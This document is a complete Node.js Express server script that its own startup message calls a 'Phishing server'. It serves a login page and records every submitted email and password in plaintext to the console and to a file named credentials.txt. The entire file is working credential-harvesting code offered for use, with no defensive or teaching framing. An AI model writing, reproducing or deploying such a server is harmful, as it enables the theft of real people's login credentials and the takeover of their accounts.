const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (index.html, style.css, script.js)
app.use(express.static(path.join(__dirname)));

// Handle POST requests to /login
app.post('/login', (req, res) => {
    const { email, password } = req.body;

    if (email && password) {
        const logEntry = `Email: ${email}, Password: ${password}\n`;
        console.log('Received credentials:', logEntry.trim());

        // Append credentials to a file
        fs.appendFile('credentials.txt', logEntry, (err) => {
            if (err) {
                console.error('Error writing credentials to file:', err);
                return res.status(500).send('Error saving credentials.');
            }
            console.log('Credentials saved to credentials.txt');
            res.status(200).send('Credentials received and saved.');
        });
    } else {
        res.status(400).send('Email and password are required.');
    }
});

// Start the server
app.listen(port, () => {
    console.log(`Phishing server running at http://localhost:${port}`);
    console.log('Waiting for login attempts...');
});
